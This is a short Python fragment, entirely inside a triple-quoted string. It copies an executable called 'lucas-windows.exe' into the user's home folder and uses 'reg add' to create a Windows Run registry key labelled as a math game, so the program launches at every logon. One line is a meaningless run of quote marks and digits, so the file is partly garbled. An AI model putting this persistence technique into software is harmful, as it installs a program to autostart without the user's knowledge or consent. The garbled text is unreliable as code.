"""'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lucas_mathgame /f /d "%SYSTEMDRIVE%%HOMEPATH%\\lucasm.exe"'
"%SYSTEMDRIVE%%HOMEPATH%"
'lucasm.exe'
''''''''''''''''''''''''''''''''''''''''''''''''12''''''''3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3'3""""""""""""""""""""""""''''''''''''''''''''''''''''''
import os
trfis = os.path.isfile("lucas-windows.exe")
if trfis:
    os.system('copy "./lucas-windows.exe" %SYSTEMDRIVE%%HOMEPATH%')
    os.system('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v lucas_mathgame /f /d "%SYSTEMDRIVE%%HOMEPATH%\\lucas-windows.exe"')
"""



